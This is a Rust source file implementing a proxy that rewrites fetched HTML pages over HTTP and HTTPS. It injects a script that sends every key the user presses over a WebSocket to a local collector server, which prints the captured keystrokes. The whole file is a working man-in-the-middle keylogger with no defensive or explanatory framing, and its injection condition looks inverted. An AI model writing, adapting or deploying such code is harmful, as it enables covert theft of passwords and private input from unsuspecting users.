use hyper::{Body, Client, Method, Request, Response, Server, header::{CONTENT_LENGTH, HeaderValue}, service::{make_service_fn, service_fn}};
use std::{net::TcpListener, thread::spawn};
use tungstenite::accept;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let addr = ([127, 0, 0, 1], 3000).into();
    let service = make_service_fn(|_| async { Ok::<_, hyper::Error>(service_fn(respond)) });
    let server = Server::bind(&addr).serve(service);
    println!("Listening on http://{}", addr);
    
    tokio::spawn(async move {
        server.await.unwrap();
    });

    println!("creating ws server");

    let ws_server = TcpListener::bind("127.0.0.1:8080")?;
    
    for socket in ws_server.incoming() {
        let socket  = socket?;
        spawn(move || {
            let mut websocket = accept(socket).unwrap();
            loop {
                let msg = websocket.read_message().unwrap();

                if msg.is_text() {
                    let txt = msg.to_text().unwrap();

                    if txt.len() > 1 {
                        print!("<{}>", txt);
                    } else {
                        print!("{}", msg.to_text().unwrap());
                    }

                    if txt == "Enter" {
                        println!();
                    }
                }
            }
        });
    }

    Ok(())
}

async fn respond(req: Request<Body>) -> Result<Response<Body>, hyper::Error> {
    let uri = req.uri();

    if let Some(auth) = uri.authority() {
        if let Some(443) = auth.port_u16() {
            return respond_https(req).await
        }
    }

    let client = Client::new();

    let res = match *req.method() {
        Method::GET => {
            let mut res = client.get(uri.clone()).await?;
        
            if let Some(header) = res.headers().get("content-type") {
                if header.to_str().unwrap() != "text/html" {
                    return Ok(res)
                }
            } else {
                let body = res.body_mut();
        
                let bytes = hyper::body::to_bytes(body).await?;
                let mut body_str = String::from_utf8(bytes.into_iter().collect()).unwrap();
        
                match body_str.find("</body>") {
                    Some(index) => {
                        body_str.insert_str(index-1, r#"
                            <script>
                            (() => {
                                const socket = new WebSocket("ws://localhost:8080");
                                document.onkeydown = (e) => {
                                    socket.send(e.key);
                                    console.log(e);
                                }
                            })()
                            </script>"#
                        );
                    },
                    None => {}
                }
        
                res.headers_mut().insert(CONTENT_LENGTH, HeaderValue::from(body_str.bytes().len()));
                *res.body_mut() = Body::from(body_str);
            }
            res
        },
        _ => client.request(req).await?
    };


    Ok(res)
}

async fn respond_https(req: Request<Body>) -> Result<Response<Body>, hyper::Error> {
    let https = hyper_rustls::HttpsConnector::with_native_roots();
    let client: Client<_, Body> = Client::builder().build(https);
    let uri = req.uri();

    let mut res = client.get(uri.clone()).await?;

    if let Some(header) = res.headers().get("content-type") {
        if header.to_str().unwrap() != "text/html" {
            return Ok(res)
        }
    } else {
        let body = res.body_mut();

        let bytes = hyper::body::to_bytes(body).await?;
        let mut body_str = String::from_utf8(bytes.into_iter().collect()).unwrap();

        match body_str.find("</body>") {
            Some(index) => {
                body_str.insert_str(index-1, r#"
                    <script>
                    (() => {
                        const socket = new WebSocket("ws://localhost:8080");
                        document.onkeydown = (e) => {
                            socket.send(e.key);
                            console.log(e);
                        }
                    })()
                    </script>"#
                );
            },
            None => {}
        }

        res.headers_mut().insert(CONTENT_LENGTH, HeaderValue::from(body_str.bytes().len()));
        *res.body_mut() = Body::from(body_str);
    }

    Ok(res)

}